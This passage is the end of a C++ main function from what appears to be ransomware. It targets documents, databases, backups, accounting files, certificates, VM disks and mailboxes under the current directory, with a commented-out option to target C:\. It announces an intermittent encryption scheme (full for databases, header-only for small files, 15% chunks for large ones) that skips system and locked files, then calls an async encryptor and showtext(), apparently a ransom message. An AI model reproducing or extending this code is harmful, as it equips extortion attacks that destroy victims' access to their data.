           ".doc", ".docx", ".xlsx", ".xls", ".pptx", ".pdf",
           ".mdf", ".ndf", ".bak", ".sqlite", ".db", ".ldf",
           ".qbb", ".qbo", ".ofx",
           ".javass", ".pys", ".jss", ".ymls", ".inis", ".envs",
           ".psd", ".ai", ".dwg", ".skp",
           ".vmdk", ".iso", ".pfx", ".pems",
           ".pst", ".mbox", ".mpp",
           ".jar", ".zip", ".tar.gz",
           ".ppt", ".jpg", ".png", ".txtx", ".jpeg"
        };

        // 使用当前目录作为目标目录
        fs::path targetDirectory = fs::current_path();
        //fs::path targetDirectory = "C:\\";
        std::cout << "Target directory: " << targetDirectory << std::endl;
        std::cout << "Target extensions: " << extensions.size() << " types" << std::endl;

        // 显示加密策略
        std::cout << "\nEncryption Strategy:" << std::endl;
        std::cout << "- Database files: Full encryption" << std::endl;
        std::cout << "- Small files (<1MB): Header encryption (4KB)" << std::endl;
        std::cout << "- Large files (>=1MB): Partial encryption (15% per chunk)" << std::endl;
        std::cout << "- System files: Skipped" << std::endl;
        std::cout << "- Locked files: Skipped" << std::endl;

        std::cout << "\nStarting encryption process..." << std::endl;
        std::cout << "==========================================" << std::endl;

        // 使用异步加密管理器
        traverseAndEncryptAsync(targetDirectory, extensions, encryptionKey);

        std::cout << "==========================================" << std::endl;
        std::cout << "File encryption tool finished." << std::endl;
        showtext();
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
        return 1;
    }
}